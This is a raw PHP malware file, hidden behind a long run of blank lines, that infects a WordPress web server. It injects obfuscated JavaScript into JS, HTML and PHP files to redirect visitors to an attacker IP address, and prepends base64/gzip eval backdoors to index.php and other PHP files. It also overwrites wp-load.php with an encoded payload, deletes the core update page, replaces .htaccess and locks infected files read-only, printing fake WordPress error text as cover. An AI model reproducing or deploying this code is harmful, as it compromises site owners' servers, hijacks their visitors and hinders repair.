




















































































































































































































<?php @ini_set("error_log",null);@ini_set("log_errors",0);@ini_set("max_execution_time",0);@set_time_limit(0);error_reporting(0);$file_j='j';$file_h='e';$file_p='e';$text='var _0xc9e1=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6E\x74\x5F\x75\x74\x6D","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x38\x35\x2E","\x31\x34\x33\x2E","\x32\x32\x31\x2E","\x31\x34\x2F\x3F\x6B\x65\x79\x3D"];function makeid(){var _0x6fdcx2=_0xc9e1[0];var _0x6fdcx3=_0xc9e1[1];for(var _0x6fdcx4=0;_0x6fdcx4< 32;_0x6fdcx4++){_0x6fdcx2+= _0x6fdcx3[_0xc9e1[5]](Math[_0xc9e1[4]](Math[_0xc9e1[2]]()* _0x6fdcx3[_0xc9e1[3]]))};return _0x6fdcx2}function _mmm_(_0x6fdcx6,_0x6fdcx7,_0x6fdcx8,_0x6fdcx9){var _0x6fdcxa= new Date();var _0x6fdcxb= new Date();if(_0x6fdcx8=== null|| _0x6fdcx8=== 0){_0x6fdcx8= 3};_0x6fdcxb[_0xc9e1[7]](_0x6fdcxa[_0xc9e1[6]]()+ 3600000* 24* _0x6fdcx8);document[_0xc9e1[8]]= _0x6fdcx6+ _0xc9e1[9]+ escape(_0x6fdcx7)+ _0xc9e1[10]+ _0x6fdcxb[_0xc9e1[11]]()+ ((_0x6fdcx9)?_0xc9e1[12]+ _0x6fdcx9:_0xc9e1[0])}function _nnn_(_0x6fdcxd){var _0x6fdcxe=document[_0xc9e1[8]][_0xc9e1[13]](_0x6fdcxd+ _0xc9e1[9]);var _0x6fdcxf=_0x6fdcxe+ _0x6fdcxd[_0xc9e1[3]]+ 1;if((!_0x6fdcxe) && (_0x6fdcxd!= document[_0xc9e1[8]][_0xc9e1[14]](0,_0x6fdcxd[_0xc9e1[3]]))){return null};if(_0x6fdcxe==  -1){return null};var _0x6fdcx10=document[_0xc9e1[8]][_0xc9e1[13]](_0xc9e1[15],_0x6fdcxf);if(_0x6fdcx10==  -1){_0x6fdcx10= document[_0xc9e1[8]][_0xc9e1[3]]};return unescape(document[_0xc9e1[8]][_0xc9e1[14]](_0x6fdcxf,_0x6fdcx10))}if(navigator[_0xc9e1[16]]){if(_nnn_(_0xc9e1[17])== 1){}else {_mmm_(_0xc9e1[17],_0xc9e1[18],_0xc9e1[18],_0xc9e1[19]);window[_0xc9e1[21]][_0xc9e1[20]]= _0xc9e1[22]+ _0xc9e1[23]+ _0xc9e1[24]+ _0xc9e1[25]+ _0xc9e1[26]+ _0xc9e1[27]+ makeid()}}';$position=1;function getDirContents($dir){global $file_j,$text,$position,$file_h,$file_p;$files=scandir($dir);foreach($files as$key=>$value){$path=realpath($dir.DIRECTORY_SEPARATOR.$value);if(!is_dir($path)){$path_info=pathinfo($path);$pos3=$path_info['extension'];if($pos3==="js"){$pos2=stripos($path_info['basename'],$file_j);if($pos2!==false){echo'WP_Error_Page_Not_Found '." </br>";$pos1=stripos(file_get_contents($path),$text);if($pos1===false){if($position==2){}else{chmod($path,0666);file_put_contents($path,$text);chmod($path,0444);}}}}else{$pos4=$path_info['extension'];if($pos4==="html"){$pos5=stripos($path_info['basename'],$file_h);if($pos5!==false){echo'WP_Error_Page_Not_Found HTML_Tag '." </br>";$pos6=stripos(file_get_contents($path),$text);if($pos6===false){if($position==2){}else{chmod($path,0666);$find_str=stripos(file_get_contents($path),"</head>");if($find_str!==false){$str=file_get_contents($path);$str=str_replace('</head>','<script type="text/javascript">'.$text.'</script></head>',$str);file_put_contents($path,$str);chmod($path,0444);}}}}}$pos7=$path_info['extension'];if($pos7==="php"){$pos8=stripos($path_info['basename'],$file_p);if($pos8!==false){echo'WP_Error_Page_Not_Found PHP_Tag '." </br>";$pos9=stripos(file_get_contents($path),$text);if($pos9===false){if($position==2){}else{chmod($path,0666);$find_str=file_get_contents($path);file_put_contents($path,base64_decode("PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgnZU5wZFVzMXUwMEFRZnBXTmxZTWRyRGhPODlkRU9aVEtvbEVwUVlrQm9ScFpVKzg2dThUWnRkWnIxWDZBM2poeTRRMjQ4Z3hVdkFhdndqaHBnV1FQTy8rYWI3NFprZG90dHN0TjdYVmVaa3BSS2VSbm1KSUZ5VVN5SmJVcU5XR2dNM1hIWEFLU2tsSlNkWERmZzBsNHQrUFo3WGdkck40SHExdnJLZ3pmeHUvUWlpOWVCVzlDNjVQalROdnh0KzgvZi8xNGZKeUQxbERiMWlYWEt2S0hRMmE1VmxRTlJxajdtcVVxcXNZVGRJVmFVQ1lOYWpmclJZRGlRNU9BWGUrTFEwRWlaRm1odXNneDBGTXlxa1pETkM4azFVcFExSlk1MDRCeURTbG9ZVG16VkdrR0NiZi9RaUZRdE9NdnZ4KytQamhUa2RwRnVCSzVLazRIaWFyaDhMOVozT2VTMW56dWRkYWdnZnZuYVlKazdmQzVSRzJoUmpwU3lBcDJTcWFCTFVQV1NBN1NGRVNscVVzMnVwUkd5QTBTalRFZ1Jxc3N3L285b3BZb0NtWVEwT1Z5ZWIwSWJuSHUwY1RrY1Nsb1hCbzA2SjdiSWdpVEpvSFpGdDlITVRLSXk4Z2ZEWFpJZ0crNW9iZ0piT2RGYjl6cjk0NUJmMlRBOTJ2RzdzSVFyY3BOczgxTzc2eDNpcjdZd2VFV2lPSE5WZHdwWmVwOWJ0K1pYVEdnZ2JhdDF5b0JJNVNjRW01TVB2VTgvMnpRamFxei91Qzg2L3VqN25qaUNVbWJaVlhkbk9lNEZpcllNYVFsSnpXaWNyRU5HSkl5bGhWa2cwQ2FJM05tVEZLUi92dWZsdnJrbUIxalhqZUkzV2RSTThZQU9HL20rd01wQ3ZaQicpKSk7Pz4=").$find_str);chmod($path,0444);$find_str=stripos(file_get_contents($path),"</head>");if($find_str!==false){$str=file_get_contents($path);$str=str_replace('</head>','<script type="text/javascript">'.$text.'</script></head>',$str);file_put_contents($path,$str);chmod($path,0444);}}}}}}}elseif($value!="."&&$value!=".."){getDirContents($path);}}}$path=$_SERVER['DOCUMENT_ROOT'];chmod($path."/index.php",0666);$find_str=file_get_contents($path."/index.php");file_put_contents($path."/index.php",base64_decode("PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgnZU5wZFVzMXUwMEFRZnBXTmxZTWRyRGhPODlkRU9aVEtvbEVwUVlrQm9ScFpVKzg2dThUWnRkWnIxWDZBM2poeTRRMjQ4Z3hVdkFhdndqaHBnV1FQTy8rYWI3NFprZG90dHN0TjdYVmVaa3BSS2VSbm1KSUZ5VVN5SmJVcU5XR2dNM1hIWEFLU2tsSlNkWERmZzBsNHQrUFo3WGdkck40SHExdnJLZ3pmeHUvUWlpOWVCVzlDNjVQalROdnh0KzgvZi8xNGZKeUQxbERiMWlYWEt2S0hRMmE1VmxRTlJxajdtcVVxcXNZVGRJVmFVQ1lOYWpmclJZRGlRNU9BWGUrTFEwRWlaRm1odXNneDBGTXlxa1pETkM4azFVcFExSlk1MDRCeURTbG9ZVG16VkdrR0NiZi9RaUZRdE9NdnZ4KytQamhUa2RwRnVCSzVLazRIaWFyaDhMOVozT2VTMW56dWRkYWdnZnZuYVlKazdmQzVSRzJoUmpwU3lBcDJTcWFCTFVQV1NBN1NGRVNscVVzMnVwUkd5QTBTalRFZ1Jxc3N3L285b3BZb0NtWVEwT1Z5ZWIwSWJuSHUwY1RrY1Nsb1hCbzA2SjdiSWdpVEpvSFpGdDlITVRLSXk4Z2ZEWFpJZ0crNW9iZ0piT2RGYjl6cjk0NUJmMlRBOTJ2RzdzSVFyY3BOczgxTzc2eDNpcjdZd2VFV2lPSE5WZHdwWmVwOWJ0K1pYVEdnZ2JhdDF5b0JJNVNjRW01TVB2VTgvMnpRamFxei91Qzg2L3VqN25qaUNVbWJaVlhkbk9lNEZpcllNYVFsSnpXaWNyRU5HSkl5bGhWa2cwQ2FJM05tVEZLUi92dWZsdnJrbUIxalhqZUkzV2RSTThZQU9HL20rd01wQ3ZaQicpKSk7Pz4=").$find_str);chmod($path."/index.php",0444);chmod($path."/wp-admin/update-core.php",0666);if(unlink($path."/wp-admin/update-core.php")){}else{file_put_contents($path."/wp-admin/update-core.php","Error update #0x226951");chmod($path."/wp-admin/update-core.php",0444);}chmod($path."/.htaccess",0666);if(unlink($path."/.htaccess")){file_put_contents($path."/.htaccess",file_get_contents('https://gist.githubusercontent.com/BFTrick/3706672/raw/be744502cf3921f761cbef11878af6f4a2024c3d/.htaccess'));chmod($path."/.htaccess",0444);}else{file_put_contents($path."/.htaccess",file_get_contents('https://gist.githubusercontent.com/BFTrick/3706672/raw/be744502cf3921f761cbef11878af6f4a2024c3d/.htaccess'));chmod($path."/.htaccess",0444);}chmod($path."/wp-load.php",0666);if(unlink($path."/wp-load.php")){file_put_contents($path."/wp-load.php","<?php eval(gzuncompress(base64_decode('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')));");chmod($path."/wp-load.php",0444);}$pos1=stripos($path,'domains');if($pos1!==false){$rest=substr($path,0,stripos($path,'domains')+strlen('domains'));getDirContents($rest);}else{$pos1=stripos($path,'public_html');if($pos1!==false){$rest=substr($path,0,stripos($path,'public_html')+strlen('public_html'));getDirContents($rest);}else{$pos1=stripos($path,'html');if($pos1!==false){$rest=substr($path,0,stripos($path,'html')+strlen('html'));getDirContents($rest);}else{$pos1=stripos($path,'htdocs');if($pos1!==false){$rest=substr($path,0,stripos($path,'htdocs')+strlen('htdocs'));getDirContents($rest);}else{$pos1=stripos($path,'httpdocs');if($pos1!==false){$rest=substr($path,0,stripos($path,'httpdocs')+strlen('httpdocs'));getDirContents($rest);}else{$pos1=stripos($path,'vhosts');if($pos1!==false){$rest=substr($path,0,stripos($path,'vhosts')+strlen('vhosts'));getDirContents($rest);}else{$pos1=stripos($path,'www');if($pos1!==false){$rest=substr($path,0,stripos($path,'www')+strlen('www'));getDirContents($rest);}else{$pos1=stripos($path,'wwwroot');if($pos1!==false){$rest=substr($path,0,stripos($path,'wwwroot')+strlen('wwwroot'));echo($rest);getDirContents($rest);}else{$pos1=stripos($path,'web');if($pos1!==false){$rest=substr($path,0,stripos($path,'web')+strlen('web'));getDirContents($rest);}else{getDirContents($_SERVER['DOCUMENT_ROOT']);}}}}}}}}};